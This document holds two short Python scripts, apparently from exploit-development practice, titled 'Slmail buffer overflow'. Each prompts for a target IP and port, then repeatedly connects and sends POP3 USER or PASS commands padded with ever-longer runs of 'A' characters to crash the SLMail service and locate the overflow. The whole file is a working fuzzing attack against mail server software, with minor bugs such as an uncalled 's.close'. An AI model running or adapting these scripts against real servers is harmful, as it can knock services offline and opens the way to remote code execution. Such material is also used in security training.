#!/usr/bin/python3

import sys,socket
import time

print("*******Slmail buffer overflow********")
ip_address=input("Enter the IP address\n")
port=input("Enter the port numeber\n")


if (len(ip_address)==0) or (len(port)==0):
    if (len(ip_address)>0) and (len(port)==0):
        print("*"*30)
        print("Port number field is empty")
    elif (len(ip_address)==0) and (len(port)>0):
        print("*"*30)
        print("IP address field is empty")
    elif (len(ip_address)==0) and (len(port)==0):
        print("*"*30)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*30)
        print("Issues with the user input")

elif (len(ip_address)>0) and (len(port)>0):
    buffer=100
    while(buffer<10000):
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address,int(port)))
        print(f"Sending buffer size --> {buffer}")
        s.send(b"USER HRISHI" + b"\r\n")
        s.send(b"USER " + b"A" * buffer + b"\r\n")
        s.close()
        buffer=buffer+200
        time.sleep(1)
------------------------------------------------------------------------------------------------------------------------------------------------------------------

#!/usr/bin/python3

import sys,socket
import time 

ip_address=input("Enter the IP address\n")
port_number=input("Enter the port number\n")

if len(ip_address)==0 or len(port_number)==0:
    if len(ip_address)>0 and len(port_number)==0:
        print("*"*50)
        print("Port number field is empty")
    elif len(ip_address)==0 and len(port_number)>0:
        print("*"*50)
        print("IP address field is empty")                                                                                                                           
    elif len(ip_address)==0 and len(port_number)==0:                                                                                                                 
        print("*"*50)                                                                                                                                                
        print("IP address field is empty")                                                                                                                           
        print("Port number field is empty")                                                                                                                          
    else:
        print("*"*50)
        print("Issues with the user input")
elif len(ip_address)>0 and len(port_number)>0:
    if not port_number.isdigit():

        print("*"*50)
        print("Port number field must contain only numeric digits")
    else:
        buffer_size=100
        while int(buffer_size)<10000:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ip_address,int(port_number)))
            print(f"Sending bufffer size --> {buffer_size}")
            s.send(b"USER HRISHI" + b"\r\n")
            s.send(b"PASS " + b"A" * buffer_size + b"\r\n")
            s.close
            buffer_size=buffer_size+200
            time.sleep(1)
